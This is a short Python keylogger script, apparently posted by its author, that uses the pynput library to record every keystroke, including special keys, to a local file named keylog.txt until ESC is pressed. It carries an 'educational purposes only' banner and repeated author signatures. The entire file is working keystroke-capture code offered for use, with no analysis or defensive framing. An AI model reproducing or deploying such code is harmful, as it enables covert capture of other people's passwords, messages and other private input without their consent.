# WARNING: This code is for educational purposes only.

from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)
# MADE BY KAIF TARASAGAR
    if key == keyboard.Key.space:
        key_char = ' '
    elif key == keyboard.Key.enter:
        key_char = '\n'
    elif key == keyboard.Key.backspace:
        key_char = '[BACKSPACE]'
    elif key == keyboard.Key.tab:
        key_char = '[TAB]'
    elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
        key_char = '[SHIFT]'
    elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
        key_char = '[CTRL]'
    elif key in (keyboard.Key.alt, keyboard.Key.alt_gr):
        key_char = '[ALT]'
    elif str(key_char).startswith('Key.'):
        key_char = key_char.replace('Key.', '')
# MADE BY KAIF TARASAGAR
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key_char)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False
# MADE BY KAIF TARASAGAR
print(f"Keylogger started. Logging keystrokes to {LOG_FILE}. Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



                                             #-- MADE BY KAIF TARASAGAR 
                                               
                                             # https://www.linkedin.com/in/kaif-tarasgar-0b5425326/
                                              
                                             # https://x.com/Kaif_T_200 